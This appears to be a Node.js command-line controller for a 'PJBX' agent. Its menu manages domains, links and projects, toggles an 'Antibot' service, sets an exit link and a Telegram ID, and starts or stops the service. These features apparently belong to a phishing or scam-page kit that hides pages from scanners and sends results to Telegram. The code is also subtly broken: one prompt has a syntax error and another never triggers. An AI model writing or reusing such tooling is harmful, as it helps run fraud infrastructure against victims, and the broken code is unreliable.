const fs = require('fs');
const path = require('path');
const inquirer = require('inquirer');
const dotenv = require('dotenv');

dotenv.config({ path: path.join(__dirname, '../.env') });

const PJBXAgent = require('./lib/PJBX-agent');

const questionList = [
  {
    type: 'list',
    message: 'Select an ACTION To Perform',
    name: 'action',
    choices: [
      'Get Information',
      'Get Traffic',
      'Add Domain',
      'Delete Domain',
      'Get All Domains',
      'Get All Links',
      'Get All Projects',
      'Change Project',
      'On Antibot',
      'Off Antibot',
      'Set Exit Link',
      'Set Telegram ID',
      'Start PJBX',
      'Stop PJBX',
    ],
  },
  {
    type: 'input',
    message: 'Enter Domain Name:',
    name: 'domainAction',
    when: (answerList) => ['Add Domain', 'Delete Domain'].includes(answerList.action),
  },
  {
    type: 'input',
    message: 'Enter Project Name:',
    name: 'projectAction',
    when: (answerList) => answerList.action === 'Change Project',
  },
  {
    type: 'input',
    message: 'Enter Antibot URL;Key:',
    name: 'antibotInfo',
    when: (answerList) => answerList.action === 'On Antibot',
  },
  {
    type: 'input',
    message: 'Enter Telegram ID:',
    name: 'telegramInfo',
    when: (answerList) => answerList.action === 'Set Telegram ID',
  },
  {
    type: 'input',
    message: 'Enter Exit Link:',
    name: 'exitLink',
    when (answerList) => answerList.action === ' Exit Link',
  },
];

inquirer.prompt(questionList).then((answerList) => {
  console.log('\n');
  switch (answerList.action) {
    case 'Get Information':
      return PJBXAgent.getInformation((success, appInfo) => {
        if (success) {
          console.log(`SERVER INFO:\n\n ${appInfo}`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Get Traffic':
      return PJBXAgent.getTraffic((success, appInfo) => {
        if (success) {
          console.log(`TRAFFIC INFO:\n\n ${appInfo}`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Add Domain':
      return PJBXAgent.addDomain(answerList.domainAction.trim(), (success, appInfo) => {
        if (success) {
          console.log(`Added Domain: ${appInfo} to the server, you can use it now..`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Delete Domain':
      return PJBXAgent.deleteDomain(answerList.domainAction.trim(), (success, appInfo) => {
        if (success) {
          console.log(`Successfully deleted domain: ${appInfo}`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Get All Domains':
      return PJBXAgent.getDomains((success, appInfo) => {
        if (success) {
          console.log(appInfo);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Get All Links':
      return PJBXAgent.getLinks((success, appInfo) => {
        if (success) {
          console.log(appInfo);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Get All Projects':
      return PJBXAgent.getProjects((success, appInfo) => {
        if (success) {
          console.log(appInfo);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Change Project':
      const projectName = answerList.projectAction;
      return PJBXAgent.changeProject(projectName, (success, appInfo) => {
        if (success) {
          console.log(`Successfully changed project to: ${projectName}, everything is OK!`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'On Antibot':
    case 'Off Antibot':
      let antibotInfo = 'null;null';
      const antibotSwitch = answerList.action === 'On Antibot'? true : false;
      if (antibotSwitch) {
        antibotInfo = answerList.antibotInfo;
      }
      return PJBXAgent.switchAntibot(antibotSwitch, antibotInfo, (success, appInfo) => {
        if (success) {
          console.log(`Successfully PJBX Agent to ${antibotSwitch}, everything is OK!`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Set Telegram ID':
      const telegramID = answerList.telegramInfo;
      return PJBXAgent.setTelegramID(telegramID, (success, appInfo) => {
        if (success) {
          console.log(`Successfully changed Telegram ID to: ${telegramID}, everything is OK!`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Set Exit Link':
      const exitLink = answerList.exitLink;
      return PJBXAgent.setExitLink(exitLink, (success, appInfo) => {
        if (success) {
          console.log(`Successfully changed Exit Link to: ${exitLink}, everything is OK!`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    case 'Start PJBX':
    case 'Stop PJBX':
      const action = answerList.action === 'Start PJBX' ? 'START' : 'STOP';
      return PJBXAgent.changeState(action, (success, appInfo) => {
        if (success) {
          console.log(`Successfully ${action}ED PJBX, everything is OK!`);
        } else {
          console.error(`Error failed to execute command.\n Error: ${appInfo}`);
        }
      });
    default:
      console.error('Could not understand command!');
  }
});
